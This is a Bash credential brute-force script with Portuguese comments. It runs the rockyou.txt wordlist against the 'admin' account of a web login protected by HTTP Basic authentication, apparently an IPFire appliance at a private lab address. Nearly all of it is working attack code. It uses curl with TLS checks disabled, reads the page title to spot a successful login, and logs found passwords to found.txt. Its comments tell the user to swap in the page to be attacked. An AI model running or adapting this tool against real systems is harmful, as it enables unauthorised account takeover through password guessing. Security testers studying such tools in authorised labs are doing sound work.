#!/bin/bash

: 'COMENTARIOS - Nao remova esta linha
Autor:
Iran Macedo - DCPT.

Info:
Brute Force para sites que possuem autenticacao via autorizacao (Header Authorization: Basic HashBase64).
Conecta no site, passando o hash de autorizacao no modelo "usuario:senha" encodado em Base64.
Analisa a resposta apos conexao e direciona uma saida de dados, baseado no resultado obtido.
Salva os dados de conexao no arquivo found.txt, no diretorio de execucao do script.
---
Linguagem:
Bash / Shell Script.
---
Saida de dados:
Erro de conexao: Codigo 401 - Nao Autorizado.
Sucesso de conexao: Usuario, senha e hash em Base64 utilizado para logar no site. 
---
Pre-reqs:
- /bin/bash
- curl
- base64
---
Versao:
bash --version
GNU bash, versão 5.0.16(1)-release (x86_64-pc-linux-gnu)
Copyright (C) 2019 Free Software Foundation, Inc.
curl --version
curl 7.68.0 (x86_64-pc-linux-gnu) libcurl/7.68.0 OpenSSL/1.1.1d
Release-Date: 2020-01-08
---
Alteracoes no navegador Curl:
- Altere o protocolo a ser utilizado: HTTP ou HTTPS.
- Modifique o endereco da pagina a ser atacada.
- Modifique o navegador e os Headers de conexao, conforme necessario.
- Altere o usuario a ser utilizado.
- Altere a lista de senhas a ser utilizada.
---
Input padrao:
usuario = admin
senha = lista de senhas "rockyou.txt"
---
Execucao:
./brute-http-base64.sh
Fim dos comentarios '


echo ""
echo "-- Brute Force - HTTPS with Base64 Authorization"
echo""

#Carregamento da lista de senhas
echo "[i] Loading wordlist. Wait..."
unset input
input="/usr/share/wordlists/rockyou.txt"

sleep 3
echo "[i] Wordlist is loaded! Let's rock!"
echo ""

#Limpando variaveis de looping
unset pass
counter=1

#Iniciando ataque de brute force
echo "[i] Brute Force started... knock knock..."

while IFS= read -r pass #Loop while das senhas carregadas
do

	#Limpando variaveis de controle e de dados
	unset filter
	unset code
	unset connect
	unset result

	#Codificando usuario e senha em Base64
	code=$( echo -e  "admin:$pass" | base64 )
	echo "|"
	echo "[$counter] Password: $pass, Encode: $code"

	#Incrementando contador de senhas testadas
	counter=$(( counter + 1 ))

	#Conectando na pagina a ser testada
	#connect=S( curl --silent http://172.16.1.250/cgi-bin/ids.cgi HTTP/1.1 \ #Descomente a linha para protocolo HTTP
	connect=$( curl --insecure --ssl --silent https://172.16.1.250:444/cgi-bin/ids.cgi HTTP/1.1 \
		-H "Host: 172.16.1.250:444" \
		-A "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0" \
		-H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" \
		-H "Accept-Language: en-US,en;q=0.5" \
		-H "Accept-Encoding: gzip, deflate" \
		-H "Connection: close" \
		-H "Upgrade-Insecure-Requests: 1" \
		-H "Authorization: Basic $code" |grep -E 'title' )

	#Teste - Descomente abaixo para ver os dados recebidos da conexao
	#echo "Value of connect: $connect"

	#Teste de validacao de acesso - Simulacao de acesso com sucesso
	#Retire os dois pontos e as aspas simples (: ') abaixo para descomentar o teste
	#Retire tambem a aspa simples apos o fi no final deste bloco!
	: 'if [ "$counter" -gt 5 ]
	then
		connect="<title>ipfire.localdomain - Credits</title>" #Modifique o title conforme necessario
	fi' #Final do teste
	#Retire esta aspa simples para utilizar o teste de acesso.

	#Limpando a saida do resultado obtido do campo Title
	result=$( echo "$connect" |cut -d '>' -f 2 |cut -d '<' -f 1 )

	#Obtendo o resultado de erro de conexao
	filter=$( echo "$connect" |grep -i required )

	#Teste - Descomente a linha abaixo para ver o resultado obtido
	#echo "Value of filter: $filter"

	#Analise do resultado
	if [ -z "$filter" ] #Se a conexao receber codigo 200 (Sucesso)
	then #Entao listamos na tela e salvamos no arquivo found.txt as credenciais
		echo ""
		echo "[+] << Found password >> [+]" |tee -a ./found.txt
		echo "[+] Encode user:pass = $code [+]" |tee -a ./found.txt
		echo "[+] User: admin - Password: $pass [+]" |tee -a ./found.txt
		echo ""
		echo "[i] Brute Force successfully completed [i]"
		echo "[i] Finished [i]"
		break #Por fim o programa sai do loop e se encerra

	else #Mas se a conexao receber codigo 401 (Nao autorizado)
		echo "[-] $result [-]" #Dispara na tela a mensagem de erro e continua sua execucao

	fi #final do Se de analise de resultado

done < "$input" #Decremento da lista de senhas e final do while

exit 0 #Encerramento do programa
